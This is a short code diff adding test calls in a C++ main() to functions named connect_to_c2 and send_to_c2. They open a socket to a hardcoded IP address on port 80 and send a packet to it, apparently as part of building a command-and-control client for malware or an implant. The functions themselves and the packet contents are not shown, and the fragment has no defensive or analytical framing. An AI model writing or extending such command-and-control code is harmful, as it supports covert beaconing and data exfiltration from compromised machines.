@@ -22,6 +22,20 @@ int main()
 	cout << "the packet is" << packet << endl; 
 
 
+	cout << "Testing the connect_to_c2 server function: " << endl; 
+	char hostname2[] = "104.26.12.54";
+	char port[] = "80";
+	SOCKET sock; 
+	sock = connect_to_c2(hostname2, port);
+
+
+
+	cout << endl << endl << "Testing the Send_to_c2 server function: " << endl;
+	int response = send_to_c2(packet, sock); 
+
+
+
+
 	// Test the functions here
 
 
